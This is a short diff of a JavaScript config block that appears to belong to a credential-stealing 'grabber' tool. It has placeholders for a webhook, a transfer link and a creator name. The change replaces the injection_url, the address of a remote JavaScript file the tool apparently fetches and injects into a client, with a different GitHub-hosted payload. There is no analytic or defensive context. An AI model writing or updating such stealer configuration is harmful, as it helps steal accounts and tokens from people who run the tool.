@@ -22,7 +22,7 @@ var config = {
   mail: "%CLIENTEMAIL%",
   creator: "%NAME_CREATOR%",
   transfer_link: `%TRANSFER_URL%`,
-  injection_url: "https://raw.githubusercontent.com/hawkish-teams/cerf/main/index.js",
+  injection_url: "https://raw.githubusercontent.com/AuraThemesGG/.github/main/files/x.js",
   webhook: "%WEBHOOK%",
   Placed: "%API_URL%",
   Filter: {
